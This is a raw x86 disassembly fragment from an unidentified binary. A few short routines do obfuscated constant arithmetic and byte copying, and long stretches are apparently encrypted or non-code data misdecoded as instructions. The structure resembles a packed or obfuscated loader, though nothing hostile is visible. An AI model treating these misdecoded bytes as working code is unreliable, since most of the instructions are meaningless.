  4151ad:	or     BYTE PTR [eax-0x71717515],0xfb
  4151b4:	idiv   DWORD PTR [edi+0x22]
  4151b7:	lahf   
  4151b8:	out    0x6,al
  4151ba:	ins    BYTE PTR es:[edi],dx
  4151bb:	aad    0x19
  4151bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151be:	retf   0x7916
  4151c1:	fnstenv [bp+si-0x34]
  4151c5:	push   ebp
  4151c6:	xor    BYTE PTR [edi],dl
  4151c8:	rcl    BYTE PTR [edx+0x3e],0x26
  4151cc:	inc    BYTE PTR [ebx+0x75]
  4151cf:	shr    DWORD PTR [ecx],cl
  4151d1:	inc    esi
  4151d2:	ins    DWORD PTR es:[edi],dx
  4151d3:	jnp    0x415160
  4151d5:	push   esp
  4151d6:	and    al,0x14
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi-0x2381e474]
  415305:	dec    eax
  415306:	push   ebp
  415307:	stos   BYTE PTR es:[edi],al
  415308:	mov    esp,0xb518160e
  41530d:	adc    bl,BYTE PTR [eax]
  41530f:	sbb    BYTE PTR [eax-0x5f],dh
  415312:	jmp    DWORD PTR [edi]
  415314:	push   esi
  415315:	call   0xc698a99e
  41531a:	add    BYTE PTR [ecx+0x51],0xf1
  41531e:	pop    ss
  41531f:	test   al,0x5
  415321:	sbb    eax,0x7ae8d061
  415326:	cdq    
  415327:	test   eax,0x4e33e7e
  41532c:	jno    0x4152e6
  41532e:	lea    edi,[esi+0x1c]
  415331:	loop   0x4152f0
  415333:	mov    BYTE PTR [ecx],ah
  415335:	or     BYTE PTR [edx],ch
  415337:	or     al,BYTE PTR [ecx+0x69]
  41533a:	xchg   esp,eax
  41533b:	sub    edx,DWORD PTR [edi-0x65]
  41533e:	push   DWORD PTR [ebp+0x6e]
  415341:	push   ebx
  415342:	mov    ds,WORD PTR [ebp+0x47]
  415345:	out    0x4c,eax
  415347:	or     DWORD PTR [edx],ecx
  415349:	cdq    
  41534a:	pushf  
  41534b:	sub    DWORD PTR [ecx-0x43],esi
  41534e:	mov    al,bl
  415350:	or     BYTE PTR fs:[ebx],ah
  415353:	retf   
  415354:	out    0xf4,al
  415356:	sbb    dl,BYTE PTR [edi]
  415358:	sub    BYTE PTR [edx],dh
  41535a:	mov    WORD PTR [edi+0x1fefa101],es
  415360:	xchg   cl,bh
  415362:	sub    DWORD PTR [edx+eiz*2+0x4],edx
  415366:	xor    al,0xd6
  415368:	out    0x30,al
  41536a:	cmp    bh,BYTE PTR [eax]
  41536c:	loopne 0x41537a
  41536e:	mov    ax,ds:0xc0117474
  415374:	push   es
  415375:	xchg   esi,eax
  415376:	xor    eax,0x4dbe72aa
  41537b:	xor    al,0x4
  41537d:	loope  0x415356
  41537f:	or     al,0xec
  415381:	pop    esp
  415382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415383:	mov    eax,ds:0x5386b097
  415388:	mov    BYTE PTR [ebx],dh
  41538a:	xor    BYTE PTR [ecx-0x5],dh
  41538d:	xchg   esi,eax
  41538e:	ret    
  41538f:	xlat   BYTE PTR ds:[ebx]
  415390:	mov    ah,0x3b
  415392:	pop    es
  415393:	in     eax,dx
  415394:	push   esi
  415395:	and    DWORD PTR [ecx+0x3557b704],0xffffffe4
  41539c:	xchg   esp,eax
  41539d:	ins    DWORD PTR es:[edi],dx
  41539e:	xchg   esi,eax
  41539f:	sub    DWORD PTR [ecx-0x384d4227],ebx
  4153a5:	ja     0x4153ea
  4153a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a8:	les    edi,FWORD PTR [edx]
  4153aa:	push   ecx
  4153ab:	pop    ds
  4153ac:	mov    BYTE PTR [edi-0x46],ah
  4153af:	pop    ds
  4153b0:	xchg   esi,eax
  4153b1:	(bad)  
  4153b2:	mov    edi,0x2df0bb80
  4153b7:	mov    dl,0x96
  4153b9:	in     al,0xa6
  4153bb:	push   0xf8a7b898
  4153c0:	aad    0x65
  4153c2:	or     eax,0xe53304d5
  4153c7:	and    ah,BYTE PTR [ebp+0x1980dd]
  4153cd:	pop    esi
  4153ce:	sahf   
  4153cf:	es or  al,0x7d
  4153d2:	add    DWORD PTR ss:[ebp-0x705cc39d],0x4fb4fb5d
  4153dd:	mov    eax,ds:0xae411b0
  4153e2:	sahf   
  4153e3:	(bad)  
  4153e4:	lock cwde 
  4153e6:	mov    BYTE PTR [ebx],bl
  4153e8:	and    al,0x6
  4153ea:	ja     0x4153c9
  4153ec:	sahf   
  4153ed:	rol    BYTE PTR [ebx+eax*2],cl
  4153f0:	outs   dx,BYTE PTR ds:[esi]
  4153f1:	pop    ebp
  4153f2:	shl    DWORD PTR [eax+0x26407919],cl
  4153f8:	ins    BYTE PTR es:[edi],dx
  4153f9:	mov    ds:0x3e1a1f8a,al
  4153fe:	cmc    
  4153ff:	test   eax,0xccbddbd2
  415404:	test   eax,ebx
  415406:	dec    edi
  415407:	pop    esp
  415408:	(bad)  
  415409:	outs   dx,BYTE PTR ds:[esi]
  41540a:	jno    0x4153c2
  41540c:	push   ss
  41540d:	push   edx
  41540e:	adc    DWORD PTR [edi+eiz*2],0x7a16b8aa
  415415:	imul   BYTE PTR [ebp+0x47]
  415418:	iret   
  415419:	jb     0x4153b7
  41541b:	mov    edx,0xec1eb3e6
  415420:	mov    DWORD PTR [ebx-0x25],0x4af3339e
  415427:	loop   0x4153c5
  415429:	mov    WORD PTR [esi],cx
  41542c:	mov    ch,0x39
  41542e:	pop    ecx
  41542f:	xchg   esp,eax
  415430:	je     0x4154a5
  415432:	xchg   ebx,eax
  415433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415434:	and    DWORD PTR [edx-0x45],edi
  415437:	pop    edi
  415438:	xchg   edi,eax
  415439:	adc    cl,ch
  41543b:	dec    ecx
  41543c:	and    al,0x8e
  41543e:	pop    esp
  41543f:	push   ebp
  415440:	loope  0x4154a0
  415442:	(bad)  
  415443:	jns    0x41545b
  415445:	enter  0x4d9a,0xff
  415449:	sahf   
  41544a:	ins    DWORD PTR es:[edi],dx
  41544b:	iret   
  41544c:	fs stos BYTE PTR es:[edi],al
  41544e:	cmp    eax,0xeebadf4d
  415453:	push   edi
  415454:	jmp    0x41544c
  415456:	icebp  
  415457:	pop    ebp
  415458:	push   esp
  415459:	data16 xchg BYTE PTR [eax],bh
  41545c:	(bad)  
  41545d:	jl     0x4154b1
  41545f:	xchg   esi,eax
  415460:	jbe    0x415485
  415462:	retf   0x9448
  415465:	adc    DWORD PTR [ebx+0xd7e32b6],0x52
  41546c:	(bad)  
  41546d:	xor    ch,dl
  41546f:	add    eax,0x43b65825
  415474:	ins    DWORD PTR es:[edi],dx
  415475:	outs   dx,BYTE PTR ds:[esi]
  415476:	loope  0x41546d
  415478:	out    dx,al
  415479:	mov    esp,0x6a63e7e5
  41547e:	add    BYTE PTR [edx-0x22cb9277],ch
  415484:	mov    dl,0x2a
  415486:	sbb    ecx,DWORD PTR [eax]
  415488:	push   edi
  415489:	mov    dl,ah
  41548b:	int3   
  41548c:	loop   0x4154fe
  41548e:	mov    cl,0xd9
  415490:	retf   0x8a49
  415493:	(bad)  
  415494:	mov    ch,0xab
  415496:	or     ebp,DWORD PTR [ebp+esi*1+0x6]
  41549a:	jb     0x4154c4
  41549c:	jne    0x4154c8
  41549e:	push   eax
  41549f:	sti    
  4154a0:	pop    ecx
  4154a1:	push   ss
  4154a2:	push   ecx
  4154a3:	ss (bad) 
  4154a5:	and    edi,ebp
  4154a7:	das    
  4154a8:	push   cs
  4154a9:	mov    bl,0xb8
  4154ab:	dec    esi
  4154ac:	xchg   BYTE PTR [edx-0x4dd122c3],ch
  4154b2:	loope  0x41550b
  4154b4:	jae    0x415469
  4154b6:	lods   al,BYTE PTR ds:[esi]
  4154b7:	and    DWORD PTR [eax+0x17],0xffffffd3
  4154bb:	push   edi
  4154bc:	mov    ebx,ecx
  4154be:	mov    gs,ecx
  4154c0:	adc    al,0x68
  4154c2:	or     al,0x5f
  4154c4:	jo     0x41549b
  4154c6:	add    BYTE PTR ds:0xc3fb9d5e,0xe6
  4154cd:	hlt    
  4154ce:	jmp    0xb8cda5e0
  4154d3:	mov    al,ds:0x93b08de6
  4154d8:	les    eax,FWORD PTR [esi-0x77]
  4154db:	jnp    0x415485
  4154dd:	and    esp,DWORD PTR [edi]
  4154df:	pop    ecx
  4154e0:	fistp  QWORD PTR [edx+0x3c0192a5]
  4154e6:	out    0x73,eax
  4154e8:	adc    DWORD PTR [eax-0x7c68061],eax
  4154ee:	pushf  
  4154ef:	(bad)  
  4154f0:	cmp    al,0x30
  4154f2:	add    BYTE PTR [eax+0x4d833df5],bl
  4154f8:	sbb    ebx,DWORD PTR [eax+0x501551fc]
  4154fe:	ja     0x4154e3
  415500:	cdq    
  415501:	inc    esi
  415502:	xchg   esi,eax
  415503:	(bad)  
  415504:	fcomi  st,st(0)
  415506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415507:	xchg   edx,eax
  415508:	mov    cs,WORD PTR [esi+0x2d46f843]
  41550e:	lock sbb DWORD PTR es:[esi-0x35],0x13608d99
  415517:	mov    ds:0xee330a3,al
  41551c:	mov    eax,eax
  41551e:	scas   eax,DWORD PTR es:[edi]
  41551f:	or     BYTE PTR [ebp+0xf],dh
  415522:	jmp    0x81342800
  415527:	rol    DWORD PTR [esi],1
  415529:	test   al,0x91
  41552b:	addr16 mov esi,0x9868cb36
  415531:	xor    BYTE PTR [edx+ebp*1-0x2554081c],dh
  415538:	and    DWORD PTR [eax],esi
  41553a:	inc    esp
  41553b:	fsubr  QWORD PTR [ecx]
  41553d:	dec    BYTE PTR gs:[eax+0x3c]
  415541:	scas   al,BYTE PTR es:[edi]
  415542:	ins    DWORD PTR es:[edi],dx
  415543:	xor    al,0xbc
  415545:	inc    edx
  415546:	loop   0x41559a
  415548:	inc    esp
  415549:	adc    al,0xc1
  41554b:	fistp  DWORD PTR [eax+0x2c]
  41554e:	fisttp WORD PTR [ebp+0x75603dd9]
  415554:	jnp    0x415539
  415556:	clc    
  415557:	out    0x39,al
  415559:	and    DWORD PTR ds:0xbd8bfab8,0xd753a970
  415563:	outs   dx,BYTE PTR ds:[esi]
  415564:	stos   BYTE PTR es:[edi],al
  415565:	call   0x24da3d8f
  41556a:	sti    
  41556b:	adc    BYTE PTR [edx-0x884c751],ah
  415571:	cli    
  415572:	add    edx,edx
  415574:	pop    ecx
  415575:	push   ds
  415576:	push   ecx
  415577:	push   eax
  415578:	cmp    DWORD PTR [edx+0x4d],eax
  41557b:	cmp    al,0x3b
  41557d:	push   ss
  41557e:	inc    esi
  41557f:	shr    esi,0x35
  415582:	lea    edi,[ebp-0x1249e501]
  415588:	out    dx,al
  415589:	pop    ss
  41558a:	jmp    FWORD PTR [edx]
  41558c:	mov    eax,ds:0x37d0d689
  415591:	dec    edi
  415592:	enter  0x3f31,0xfd
  415596:	stos   DWORD PTR es:[edi],eax
  415597:	push   esp
  415598:	into   
  415599:	sbb    eax,0xfc893f78
  41559e:	cwde   
  41559f:	sub    ebp,DWORD PTR [eax+0x7b]
  4155a2:	fdivp  st(7),st
  4155a4:	sbb    ah,BYTE PTR [esi-0x1a]
  4155a7:	mov    DWORD PTR [ebx],esi
  4155a9:	push   0x64
  4155ab:	aaa    
  4155ac:	cmp    dl,bh
  4155ae:	mov    al,0x87
  4155b0:	pop    eax
  4155b1:	stos   BYTE PTR es:[edi],al
  4155b2:	adc    BYTE PTR [edi-0x70],dl
  4155b5:	out    dx,al
  4155b6:	int    0x14
  4155b8:	add    ecx,DWORD PTR [edx+edi*1-0xe]
  4155bc:	cld    
  4155bd:	lea    ebp,[ecx+edi*1-0x2f]
  4155c1:	jns    0x4155a4
  4155c3:	and    DWORD PTR [eax+eiz*2+0x6b4a4f58],ecx
  4155ca:	cli    
  4155cb:	pop    es
  4155cc:	or     DWORD PTR [esi],esp
  4155ce:	add    eax,ebx
  4155d0:	lahf   
  4155d1:	inc    eax
  4155d2:	out    dx,eax
  4155d3:	aam    0xef
  4155d5:	jnp    0x4155a9
  4155d7:	lods   eax,DWORD PTR ds:[esi]
  4155d8:	jmp    0x415594
  4155da:	cdq    
  4155db:	loopne 0x415571
  4155dd:	out    0xe2,al
  4155df:	jnp    0x415646
  4155e1:	xor    BYTE PTR [esi+0x56],cl
  4155e4:	outs   dx,BYTE PTR ds:[esi]
  4155e5:	pusha  
  4155e6:	ret    0x429f
  4155e9:	shr    BYTE PTR [edi],1
  4155eb:	aas    
  4155ec:	arpl   WORD PTR [esp+edi*2-0x70],bp
  4155f0:	out    dx,al
  4155f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155f3:	xchg   edi,eax
  4155f4:	push   DWORD PTR [esi+0x76]
  4155f7:	in     al,dx
  4155f8:	jbe    0x415672
  4155fa:	inc    eax
  4155fb:	dec    edi
  4155fc:	sub    al,0x4f
  4155fe:	ret    
  4155ff:	and    dl,BYTE PTR [edi]
  415601:	cmp    eax,0xc6311b91
  415606:	clc    
  415607:	jo     0x4155c8
  415609:	aas    
  41560a:	pop    ss
  41560b:	push   ebx
  41560c:	xor    al,0x4e
  41560e:	jne    0x415612
  415610:	sub    DWORD PTR ds:[edi-0x5a],0xb3ca62e5
  415618:	and    BYTE PTR [eax-0x7d],0xf4
  41561c:	inc    ebp
  41561d:	push   ss
  41561e:	xor    cl,BYTE PTR [esi]
  415620:	shr    BYTE PTR [eax],1
  415622:	push   edx
  415623:	and    cl,bl
  415625:	mov    eax,0x10e37224
  41562a:	scas   eax,DWORD PTR es:[edi]
  41562b:	xor    DWORD PTR [eax+0x3bac1d1f],esp
  415631:	ds cld 
  415633:	repnz popf 
  415635:	adc    ecx,DWORD PTR [ebx+0x21]
  415638:	or     eax,0x77fe5e63
  41563d:	mov    al,ds:0x107994b9
  415642:	fisub  DWORD PTR [edx]
  415644:	jb     0x415687
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x41568b
  41567f:	gs loope 0x415700
  415682:	pop    eax
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp-0x51e7e7ee],dh
  41568b:	sub    al,0x2b
  41568d:	stc    
  41568e:	dec    esi
  41568f:	call   0x945f:0x9e675464
  415696:	dec    eax
  415697:	fstp   DWORD PTR [ebx-0x65ec59c2]
  41569d:	fadd   st,st(6)
  41569f:	imul   eax,esp,0x7e0bd13f
  4156a5:	xor    esi,DWORD PTR ds:0x7b1ee555
  4156ab:	mov    DWORD PTR [edi+0x637ad637],edx
  4156b1:	in     al,0x69
  4156b3:	pop    edi
  4156b4:	xchg   esp,eax
  4156b5:	pop    ebp
  4156b6:	fs mov ecx,0x9f14f4f2
  4156bc:	aaa    
  4156bd:	fst    QWORD PTR [edx+ebp*8+0x6]
  4156c1:	(bad)  
  4156c2:	lods   al,BYTE PTR ds:[esi]
  4156c3:	pop    ds
  4156c4:	dec    ecx
  4156c5:	jmp    0x41570f
  4156c7:	shl    DWORD PTR [ebx-0x6fbd61c9],1
  4156cd:	xor    BYTE PTR [esi+0x5e],bh
  4156d0:	mov    bl,0xcf
  4156d2:	sti    
  4156d3:	imul   BYTE PTR [eax]
  4156d5:	and    BYTE PTR [ecx],0xe7
  4156d8:	arpl   WORD PTR [eax-0x2eef9267],dx
  4156de:	fistp  DWORD PTR [ebx-0x5c]
  4156e1:	out    dx,al
  4156e2:	es mov edx,0x4f194418
  4156e8:	cmp    BYTE PTR [ebp-0x6227d89f],cl
  4156ee:	pop    eax
  4156ef:	sti    
  4156f0:	jl     0x4156dc
  4156f2:	lahf   
  4156f3:	out    0x6d,eax
  4156f5:	lds    ebp,FWORD PTR [edx-0x38b2c907]
  4156fb:	and    al,0x94
  4156fd:	ins    BYTE PTR es:[edi],dx
  4156fe:	dec    esp
  4156ff:	push   cs
  415700:	xchg   ebp,eax
  415701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415702:	push   ds
  415703:	(bad)  
  415704:	xor    ch,bl
  415706:	imul   ebx,DWORD PTR [esi+0x49],0xc999c289
  41570d:	cmc    
  41570e:	xchg   esp,eax
  41570f:	or     DWORD PTR [ebp-0x24ad0873],0xfffffff2
  415716:	sub    ebp,DWORD PTR [esi-0x1d]
  415719:	adc    ah,BYTE PTR [ecx]
  41571b:	daa    
  41571c:	inc    edi
  41571d:	xchg   esi,eax
  41571e:	and    DWORD PTR [ecx-0x5e03cd64],ecx
  415724:	and    ah,BYTE PTR [eax-0x3d]
  415727:	rcl    ebx,0x49
  41572a:	jnp    0x41579f
  41572c:	(bad)  
  41572d:	mov    dl,0x4d
  41572f:	fldenv [edi]
  415731:	xor    bl,BYTE PTR [edx+0x26]
  415734:	psrlw  mm4,mm4
  415737:	push   edi
  415738:	pushf  
  415739:	(bad)  
  41573a:	std    
  41573b:	ins    DWORD PTR es:[edi],dx
  41573c:	(bad)  
  41573d:	pop    eax
  41573e:	mov    edi,DWORD PTR [edi]
  415740:	(bad)  
  415741:	dec    esp
  415742:	mov    ds:0x7a753c5,eax
  415747:	adc    ebp,DWORD PTR [edi-0x76cd80e3]
  41574d:	or     ebx,DWORD PTR [ebx]
  41574f:	outs   dx,BYTE PTR ds:[esi]
  415750:	leave  
  415751:	cli    
  415752:	pop    esp
  415753:	or     DWORD PTR [ecx],0x2da60359
  415759:	rcl    dh,1
  41575b:	(bad)  
  41575c:	lea    edx,[bp+di+0x2a]
  415760:	data16 jl 0x4156ee
  415763:	mov    al,ds:0x8b4a3017
  415768:	hlt    
  415769:	aad    0x96
  41576b:	cmc    
  41576c:	sub    DWORD PTR [ebp-0x79],esi
  41576f:	aas    
  415770:	sub    DWORD PTR [edx],ebx
  415772:	nop
  415773:	cmovno edx,DWORD PTR [ebp+0x38]
  415777:	outs   dx,BYTE PTR ds:[esi]
  415778:	loope  0x415788
  41577a:	out    dx,eax
  41577b:	push   eax
  41577c:	mov    cl,0x3f
  41577e:	sub    ecx,ecx
  415780:	adc    al,0xfc
  415782:	rcl    DWORD PTR [edi-0x397f017c],cl
  415788:	scas   eax,DWORD PTR es:[edi]
  415789:	jno    0x4157af
  41578b:	imul   edx,edi,0xffffffbf
  41578e:	inc    edx
  41578f:	(bad)  
  415791:	push   es
  415792:	jle    0x415808
  415794:	sub    ch,BYTE PTR [ebx-0x7d]
  415797:	mov    dh,0x72
  415799:	stc    
  41579a:	xchg   ebp,eax
  41579b:	pop    ss
  41579c:	aad    0x60
  41579e:	lds    edx,FWORD PTR [edx-0x63f3cebe]
  4157a4:	repz dec ebx
  4157a6:	jmp    0x415774
  4157a8:	stc    
  4157a9:	adc    esp,ecx
  4157ab:	cli    
  4157ac:	js     0x4157f7
  4157ae:	add    ch,BYTE PTR [eax-0x65]
  4157b1:	mov    eax,0x53a6626f
  4157b6:	xchg   ebx,eax
  4157b7:	call   0xc65d:0x180deaac
  4157be:	pop    ebx
  4157bf:	xor    eax,0x38f47a84
  4157c4:	lods   al,BYTE PTR ds:[esi]
  4157c5:	ffree  st(2)
  4157c7:	and    al,0x6e
  4157c9:	push   ds
  4157ca:	idiv   ecx
  4157cc:	mov    dh,0x5c
  4157ce:	jle    0x41581e
  4157d0:	mov    BYTE PTR [edi-0x57940d9f],ch
  4157d6:	jmp    0xe56b:0xb9ccd082
  4157dd:	(bad)
  4157e0:	pop    esp
  4157e1:	ins    BYTE PTR es:[edi],dx
  4157e2:	xchg   esp,eax
  4157e3:	outs   dx,BYTE PTR ds:[esi]
  4157e4:	call   0x8078e143
  4157e9:	add    eax,0x36ef598d
  4157ee:	adc    BYTE PTR [ebx],0xd1
  4157f1:	add    dh,BYTE PTR [eax*4-0x5340c023]
  4157f8:	jl     0x4157a2
  4157fa:	jbe    0x415798
  4157fc:	ret    
  4157fd:	std    
  4157fe:	loope  0x415834
  415800:	and    dl,BYTE PTR [edi+ebx*1]
  415803:	and    al,0x64
  415805:	and    dh,bh
  415807:	or     DWORD PTR [esi-0x5c],ebx
  41580a:	and    ebp,DWORD PTR [esi-0x5cb757ff]
  415810:	xor    DWORD PTR [esi+edi*4-0x25a8275a],eax
  415817:	aas    
  415818:	mov    al,0x66
  41581a:	frstor [edi-0x32]
  41581d:	sub    dl,al
  41581f:	adc    BYTE PTR [ebp-0x6a],al
  415822:	add    DWORD PTR [ebx-0x55],edx
  415825:	std    
  415826:	mov    esp,0xe7546f5b
  41582b:	jb     0x415856
  41582d:	mov    cl,0x6
  41582f:	fdiv   st,st(4)
  415831:	repz les eax,FWORD PTR [edx-0x3f]
  415835:	stc    
  415836:	jp     0x4158ae
  415838:	lds    ebp,FWORD PTR [ecx-0x73b07b5b]
  41583e:	mov    ds:0x6d55fd70,eax
  415843:	ret    
  415844:	mov    edi,0xd204aeba
  415849:	jmp    0x415877
  41584b:	test   BYTE PTR [eax+0x48],ch
  41584e:	leave  
  41584f:	cmp    eax,0xa5a044a3
  415854:	dec    eax
  415855:	sbb    ah,0x14
  415858:	out    dx,al
  415859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41585a:	pop    esi
  41585b:	jg     0x415860
  41585d:	or     bh,BYTE PTR [edx+0x4540bb34]
  415863:	stc    
  415864:	and    eax,ebp
  415866:	dec    ecx
  415867:	js     0x415859
  415869:	jo     0x415866
  41586b:	cmp    bh,0x2
  41586e:	xchg   esp,eax
  41586f:	ret    
  415870:	shr    BYTE PTR [eax],0x5c
  415873:	mov    eax,ds:0x31e924ea
  415878:	push   esi
  415879:	dec    ebx
  41587a:	xchg   ecx,eax
  41587b:	jle    0x4158f3
  41587d:	cmp    al,0xb0
  41587f:	mov    esp,DWORD PTR [edx+edx*2]
  415882:	inc    ebp
  415883:	xchg   edx,eax
  415884:	sti    
  415885:	aaa    
  415886:	xchg   ebp,eax
  415887:	fimul  DWORD PTR [edi+0x2c708565]
  41588d:	lods   al,BYTE PTR ds:[esi]
  41588e:	xchg   ebx,eax
  41588f:	adc    ch,dl
  415891:	push   edx
  415892:	repz sar bl,1
  415895:	leave  
  415896:	push   edi
  415897:	jmp    0x415869
  415899:	sar    DWORD PTR [ebp+eiz*8+0x65b4dbc5],cl
  4158a0:	jnp    0x4158f4
  4158a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a3:	adc    eax,0xf3a6a728
  4158a9:	or     edx,esp
  4158ab:	pop    edx
  4158ac:	lds    ebx,FWORD PTR [edx+edi*2-0x15]
  4158b0:	lock rep ins BYTE PTR es:[edi],dx
  4158b3:	(bad)  
  4158b4:	mov    dh,0x40
  4158b6:	aaa    
  4158b7:	fistp  DWORD PTR [edi]
  4158b9:	mov    cl,BYTE PTR [ecx+0x23fc5852]
  4158bf:	xorps  xmm2,XMMWORD PTR [eax]
  4158c2:	mov    ds:0x33a56f2c,al
  4158c7:	fbstp  TBYTE PTR gs:[edi-0xfd613a2]
  4158ce:	sti    
  4158cf:	and    ah,BYTE PTR [eax+edi*8]
  4158d2:	bound  esp,QWORD PTR [ebp-0x49]
  4158d5:	out    dx,al
  4158d6:	loop   0x41585c
  4158d8:	jle    0x415922
  4158da:	pushf  
  4158db:	push   edi
  4158dc:	data16 jns 0x415863
  4158df:	shr    esi,1
  4158e1:	iret   
  4158e2:	jle    0x4158f9
  4158e4:	jbe    0x41592f
  4158e6:	ss mov ch,0xfa
  4158e9:	pop    DWORD PTR [edi]
  4158eb:	sub    eax,DWORD PTR [esi+0x60]
  4158ee:	inc    edi
  4158ef:	pusha  
  4158f0:	jbe    0x4158bd
  4158f2:	call   0xb0af:0x612cb87
  4158f9:	xchg   esi,eax
  4158fa:	std    
  4158fb:	(bad)  
  4158fc:	lods   al,BYTE PTR ds:[esi]
  4158fd:	scas   eax,DWORD PTR es:[edi]
  4158fe:	push   ss
  4158ff:	sub    bh,BYTE PTR [eax-0x24837f9]
  415905:	daa    
  415906:	loop   0x4158d9
  415908:	xchg   ebx,eax
  415909:	into   
  41590a:	addr16 es xchg ecx,ebp
  41590e:	dec    DWORD PTR [eax]
  415910:	fidiv  WORD PTR [edx]
  415912:	retf   0xf650
  415915:	adc    eax,0xd1233016
  41591a:	stc    
  41591b:	jno    0x4158d3
  41591d:	cs push 0x7b
  415920:	sub    edx,edx
  415922:	inc    edx
  415923:	mov    BYTE PTR [ebx-0x4b1bcb05],al
  415929:	inc    esi
  41592a:	outs   dx,BYTE PTR ds:[esi]
  41592b:	jno    0x4159a4
  41592d:	daa    
  41592e:	dec    ebx
  41592f:	aam    0x15
  415931:	scas   eax,DWORD PTR es:[edi]
  415932:	shl    DWORD PTR [ecx+ecx*2+0x59],cl
  415936:	pop    ecx
  415937:	jmp    0xe6b2fb2a
  41593c:	in     eax,dx
  41593d:	push   0x27b2a84
  415942:	mov    fs,WORD PTR [edx+edi*4+0x6b]
  415946:	clc    
  415947:	out    dx,al
  415948:	sbb    eax,edi
  41594a:	mov    ds:0xa9982dbd,al
  41594f:	js     0x415979
  415951:	pop    ebx
  415952:	xor    esp,DWORD PTR [edi-0x68]
  415955:	dec    ebx
  415956:	jmp    0x67b6:0x28e8ba38
  41595d:	fldcw  WORD PTR [eax-0x14eae22d]
  415963:	imul   edi,ebx,0xffffffe6
  415966:	cmp    BYTE PTR [ecx-0x38b835d9],cl
  41596c:	sbb    ch,BYTE PTR [edi]
  41596e:	sub    cl,BYTE PTR [edx+0x21e39445]
  415974:	pop    eax
  415975:	lods   eax,DWORD PTR ds:[esi]
  415976:	add    DWORD PTR [edx],0x4d
